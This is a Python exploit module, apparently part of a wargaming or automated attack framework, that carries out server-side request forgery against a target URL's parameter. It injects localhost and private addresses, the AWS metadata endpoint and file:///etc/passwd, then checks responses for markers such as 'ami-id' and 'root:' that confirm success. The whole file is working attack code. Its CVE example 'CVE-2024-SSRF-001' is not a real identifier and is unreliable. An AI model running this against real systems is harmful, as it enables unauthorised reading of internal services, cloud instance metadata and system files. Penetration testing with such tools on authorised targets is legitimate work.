"""
SSRF Exploit (CWE-918) - Server-Side Request Forgery.

Tests for SSRF via internal URL access.

Author: MAXIMUS Wargaming Team
Date: 2025-10-11
"""

import asyncio
import httpx
import time

from exploit_database import ExploitResult, ExploitStatus, ExploitCategory


EXPLOIT_ID = "cwe_918_ssrf"
NAME = "SSRF - Server-Side Request Forgery"
DESCRIPTION = "Tests for SSRF via internal URL access (localhost, 127.0.0.1, private IPs)"
CATEGORY = "ssrf"
CWE_IDS = ["CWE-918"]
CVE_EXAMPLES = ["CVE-2024-SSRF-001"]


async def execute(target_url: str, timeout: int = 30, **kwargs) -> ExploitResult:
    """Execute SSRF exploit"""
    start_time = time.time()
    output_lines = []
    
    try:
        payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",  # IPv6 localhost
            "http://169.254.169.254",  # AWS metadata
            "http://192.168.1.1",
            "file:///etc/passwd",
        ]
        
        param_name = kwargs.get("param_name", "url")
        
        async with httpx.AsyncClient(timeout=timeout) as client:
            for payload in payloads:
                output_lines.append(f"Testing SSRF: {payload}...")
                
                params = {param_name: payload}
                
                try:
                    response = await client.get(target_url, params=params)
                    response_text = response.text.lower()
                    
                    indicators = [
                        "localhost",
                        "127.0.0.1",
                        "ami-id",  # AWS metadata
                        "instance-id",
                        "root:",  # file:// success
                    ]
                    
                    for indicator in indicators:
                        if indicator in response_text:
                            duration = time.time() - start_time
                            output_lines.append(f"✓ SSRF confirmed: '{indicator}' in response")
                            
                            return ExploitResult(
                                exploit_id=EXPLOIT_ID,
                                category=ExploitCategory(CATEGORY),
                                status=ExploitStatus.SUCCESS,
                                success=True,
                                output="\n".join(output_lines),
                                error=None,
                                duration_seconds=duration,
                                metadata={"payload": payload, "indicator": indicator}
                            )
                    
                    output_lines.append("  No indicators found")
                    
                except httpx.HTTPError as e:
                    output_lines.append(f"  Error: {e}")
        
        duration = time.time() - start_time
        output_lines.append("✗ No SSRF detected (likely patched)")
        
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.FAILED,
            success=False,
            output="\n".join(output_lines),
            error=None,
            duration_seconds=duration,
            metadata={}
        )
        
    except asyncio.TimeoutError:
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.TIMEOUT,
            success=False,
            output="\n".join(output_lines),
            error="Timeout",
            duration_seconds=time.time() - start_time,
            metadata={}
        )
    
    except Exception as e:
        return ExploitResult(
            exploit_id=EXPLOIT_ID,
            category=ExploitCategory(CATEGORY),
            status=ExploitStatus.ERROR,
            success=False,
            output="\n".join(output_lines),
            error=str(e),
            duration_seconds=time.time() - start_time,
            metadata={}
        )
